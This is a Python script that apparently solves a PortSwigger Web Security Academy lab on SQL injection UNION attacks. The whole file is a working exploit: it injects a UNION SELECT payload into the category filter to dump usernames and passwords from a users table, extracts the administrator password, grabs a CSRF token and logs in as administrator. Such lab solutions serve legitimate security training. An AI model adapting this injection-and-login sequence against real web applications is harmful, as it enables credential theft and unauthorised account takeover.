#https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
from utils import *

url="https://0a15000204798a4484bcf07e0096000c.web-security-academy.net/"
payload="filter?category=' UNION SELECT NULL,username||'~'||password FROM users--"
exploit=f"{url}{payload}"
response=requests.get(exploit)
soup=parse_html(response)
for row in soup.find_all('th'):
    if "administrator" in row.text:
        password=row.text.split('~')[1]

session=requests.Session()
token=parse_html(session.get(f"{url}login")).find('input')['value']

payload={
    "username":'administrator',
    "password":password,
    "csrf":token
}
soup=parse_html(session.post(f"{url}login",data=payload))
print(check_succes(soup))